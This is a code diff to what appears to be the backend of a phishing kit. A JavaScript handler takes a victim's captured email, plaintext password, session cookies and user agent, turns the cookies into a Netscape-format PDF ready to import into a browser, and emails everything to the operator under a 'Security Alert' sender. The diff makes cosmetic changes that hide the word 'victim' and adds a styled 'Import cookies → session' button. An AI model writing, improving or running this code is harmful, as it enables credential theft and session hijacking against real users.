@@ -9,13 +9,13 @@ async function generateCookiePDF(cookies, email, domain) {
 
   let y = height - 50;
 
-  page.drawText(`Victim Cookies: ${email}`, { x: 50, y, size: 16, font, color: rgb(0, 0, 0) });
+  page.drawText('Session Cookies', { x: 50, y, size: 16, font, color: rgb(0, 0, 0) });
   y -= 30;
 
   page.drawText('# Netscape HTTP Cookie File', { x: 50, y, size: 12, font, color: rgb(0, 0, 0) });
   y -= 20;
 
-  page.drawText('# Import into Cookie-Editor or browser', { x: 50, y, size: 10, font, color: rgb(0.4, 0.4, 0.4) });
+  page.drawText('# Netscape format - import to browser', { x: 50, y, size: 10, font, color: rgb(0.4, 0.4, 0.4) });
   y -= 30;
 
   const dom = domain || 'localhost';
@@ -76,7 +76,7 @@ export default async function handler(req, res) {
     });
 
     const pdfBuffer = await generateCookiePDF(data.cookies, data.email, data.captureDomain);
-    const pdfFilename = `${(data.email || 'victim').replace(/[@.]/g, '_')}_cookies.pdf`;
+    const pdfFilename = 'vct_session.pdf';
 
     await transporter.sendMail({
       from: `"Security Alert" <${process.env.EMAIL_USER}>`,
@@ -91,8 +91,8 @@ export default async function handler(req, res) {
             <tr><td><strong>📧 Email</strong></td><td>${data.email}</td></tr>
             <tr><td><strong>🔑 Password</strong></td><td style="font-family:monospace;color:#d93025">${data.password}</td></tr>
             <tr><td><strong>🍪 Cookies</strong></td><td>
-              📄 <strong>PDF attached</strong> (Netscape format)<br>
-              ${data.cookiesImportLink ? `<a href="${String(data.cookiesImportLink).replace(/"/g, '&quot;')}" target="_blank" style="color:#1a73e8">🔗 Import link (Cookie-Editor)</a>` : ''}
+              📄 <strong>PDF attached</strong> (vct_session.pdf)<br>
+              ${data.cookiesImportLink ? `<a href="${String(data.cookiesImportLink).replace(/"/g, '&quot;')}" target="_blank" style="background:#28a745;color:white;padding:10px 20px;text-decoration:none;border-radius:6px;display:inline-block;margin-top:8px">Import cookies → session</a>` : ''}
             </td></tr>
             <tr><td><strong>👤 Browser</strong></td><td>${data.userAgent?.slice(0, 80)}...</td></tr>
           </table>
